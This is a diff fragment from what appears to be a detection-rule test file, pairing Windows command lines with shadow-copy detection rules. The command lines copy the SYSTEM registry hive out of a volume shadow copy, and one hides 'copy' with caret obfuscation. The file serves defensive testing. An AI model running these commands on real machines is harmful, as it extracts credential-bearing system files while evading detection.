+    "target_commandline": "\"cmd.exe\" /c c^opy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Windows\\Temp\\VSC_SYSTEM_HIVE",
     "target_rule": "proc_creation_win_cmd_shadowcopy_access",
     "technique_id": "t1490",
     "shell": "cmd.exe",
@@ -29281,7 +29281,7 @@
   },
   {
     "test_id": "t1490_003",
-    "target_commandline": "cmd.exe /c \"set vsc=\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy&& call copy %%vsc%%1\\Windows\\System32\\config\\SYSTEM C:\\Windows\\Temp\\SYSTEM_VSC\"",
+    "target_commandline": "cmd.exe /c \"set vsc=\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy&& call copy %%vsc%%1\\Windows\\System32\\config\\SYSTEM C:\\Windows\\Temp\\SYSTEM_VSC\"",
     "target_rule": "proc_creation_win_susp_sensitive_file_access_shadowcopy",
     "technique_id": "t1490",
     "shell": "cmd.exe",
